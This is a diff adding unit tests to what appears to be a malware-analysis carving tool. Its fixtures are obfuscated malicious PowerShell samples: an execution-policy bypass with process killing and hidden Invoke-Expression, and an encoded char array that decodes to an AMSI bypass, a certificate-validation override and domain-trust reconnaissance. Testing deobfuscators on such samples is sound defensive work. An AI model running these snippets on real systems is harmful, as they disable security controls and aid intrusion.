@@ -172,3 +172,65 @@ class TestCarve(TestUnitBase):
     def test_carve_intarray(self):
         data = B'$$$x = 1,2,3,4;\r\n'
         self.assertEqual(bytes(data | self.load('intarray')), b'1,2,3,4')
+
+    def test_carve_ps1str(self):
+        def multibytes(c):
+            return inspect.getdoc(c).encode('utf8')
+
+        @multibytes
+        class data:
+            """
+            Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
+            "RegSvcs", "mshta", "wscript", "msbuild" | ForEach-Object { Stop-Process -Name $_ -Force }
+            $downloadsFolder = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads')
+
+            $lulli = @'
+            $muthal = "^^^^0011^^^^^^-101011010101-10".replace('^','000').replace('~','111').replace('-','100')
+            $bulgumchupitum = '11101110-*1^1010111-110^1011^1101110-1011^0^0-010^111110-1010'.replace('*','1000000').replace('-','10000').replace('^','100')
+
+            #kcuf em rederhar
+            '@
+            [IO.File]::WriteAllText("KAMASUTRAKI", $lulli)
+            $lulli | .('{1}{Â°Â°Â°Â°Â°}'.replace('Â°Â°Â°Â°Â°','0')-f'!','I').replace('!','ex')
+
+            $scriptPath = $MyInvocation.MyCommand.Path
+            """
+
+        test = data | self.load('ps1str', decode=True) | [str]
+        self.assertEqual(test[0], 'RegSvcs')
+        self.assertEqual(test[1], 'mshta')
+        self.assertTrue(test[5].startswith("$muthal"))
+        self.assertTrue(test[5].endswith("rederhar"))
+        self.assertEqual(test[6], 'KAMASUTRAKI')
+
+    def test_integer_array_irregular_spacing(self):
+        data = (
+            B'''cmd.exe /Q /c powershell.exe -exec bypass -noni -nop -w 1 -C "&((Get-VArIAblE '*mDr*').naMe[3,11,2]-'''
+            B'''joIn'') (-Join(( 91 ,78 ,101, 116 ,46 ,83 , 101 , 114 , 118 ,105 , 99, 101, 80 ,111, 105 , 110,116,7'''
+            B'''7,97, 110 ,97 , 103,101, 114 , 93 , 58, 58 , 83, 101 ,114,118 , 101 , 114,67, 101 ,114, 116 , 105, 1'''
+            B'''02 ,105,99 ,97 ,116 , 101,86 , 97, 108, 105,100 ,97 , 116 ,105 , 111 ,110, 67 , 97 ,108,108, 98 , 97'''
+            B''', 99,107 ,32 ,61 , 32, 123 ,36 ,116 ,114, 117 , 101,125 , 10, 116 ,114 ,121 ,123 ,10,91 ,82 , 101, 1'''
+            B'''02, 93, 46,65,115 , 115,101, 109, 98 ,108 , 121, 46 ,71 , 101, 116 , 84 , 121,112 , 101,40 , 39 , 83'''
+            B''' , 121, 115 , 39 , 43 ,39 ,116 ,101 ,109,46 ,77,97 ,110 , 39,43 ,39, 97,103 , 101,109 ,101,110,116,'''
+            B'''46 , 65,117, 116, 39, 43,39, 111 ,109 ,97 ,116 , 105 ,111 , 110 ,46 ,65,109 , 39, 43, 39 , 115, 105'''
+            B''', 85, 116,39 ,43 , 39 ,105,108 , 115 , 39 ,41 ,46,71,101 ,116 ,70, 105, 101,108,100 ,40 ,39 ,97 ,10'''
+            B'''9 ,39,43, 39 , 115 ,105, 73 ,110, 105 ,39,43 ,39,116, 70 , 97,105 , 108 ,101, 100, 39 ,44 , 32, 39 '''
+            B''',78,111, 110, 80 ,39 , 43,39, 117 , 98 ,108,105 , 99,44 , 83 , 116 ,97 , 39, 43 ,39,116, 105, 99, 3'''
+            B'''9 ,41,46 ,83,101 , 116 ,86, 97 , 108 , 117, 101, 40,36, 110 ,117 , 108 ,108 , 44, 32 ,36, 116, 114 '''
+            B''',117, 101 ,41 ,10,125,99 , 97 ,116 ,99, 104 , 123 , 125, 10, 110, 108 , 116 , 101 ,115,116,32, 47, '''
+            B'''100,111, 109 ,97,105, 110 ,95, 116 ,114,117 , 115 , 116 ,115)| ForeaCH{ ( [cHAr] [iNt] $_) }))\n   '''
+            B'''12, 31, 9''')
+        t1 = data | self.ldu('csb', 'intarray') | self.ldu('pack') | bytes
+        t2 = data | self.ldu('csd', 'intarray') | bytes
+        t3 = data | self.load('intarray', single=True, decode=True) | bytes
+        self.assertEqual(len({t1, t2, t3}), 1)
+        self.assertGreater(len(t1), 200)
+
+    def test_carve_utf16_be(self):
+        data = B'%s%s%s' % (
+            self.generate_random_buffer(20),
+            'af2d4e6bc8'.encode('utf-16be'),
+            self.generate_random_buffer(20))
+        goal = 'af2d4e6bc8'
+        test = data | self.load('hex') | str
+        self.assertEqual(goal, test)
